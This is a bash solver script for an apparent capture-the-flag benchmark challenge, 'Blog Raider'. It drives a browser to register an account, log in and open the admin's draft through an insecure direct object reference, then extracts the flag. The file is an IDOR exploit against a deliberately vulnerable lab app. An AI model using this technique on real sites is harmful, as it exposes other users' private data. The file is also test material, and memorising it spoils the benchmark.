#!/usr/bin/env bash
# XBEN-090-24 — "Blog Raider" (tags: idor, privilege_escalation)
#
# `/edit_draft/<id>` loads the draft the URL names and renders it into the edit
# form. The ownership check is in the file, commented out. Draft 1 is the admin's
# and its content is the flag.
#
# The forms are Flask-WTF, so each carries a CSRF token that a hand-built POST
# would have to lift out of the page first. Driving the page instead — fill the
# fields, submit the form — keeps the token where the browser put it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben090-$$"
DRAFT="${2:-1}"
NAME="raider$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

fill() { "$H5I" browser type --selector "$1" "$2" --session "$SESSION" >/dev/null; }

"$H5I" browser open "$URL/register" --session "$SESSION" --new --capture >/dev/null
fill '#username' "$NAME"
fill '#password' 'Passw0rd!'
fill '#confirm_password' 'Passw0rd!'
"$H5I" browser submit --selector '#submit' --session "$SESSION" >/dev/null

fill '#username' "$NAME"
fill '#password' 'Passw0rd!'
"$H5I" browser submit --selector '#submit' --session "$SESSION" >/dev/null

"$H5I" browser navigate "$URL/edit_draft/$DRAFT" --session "$SESSION" >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
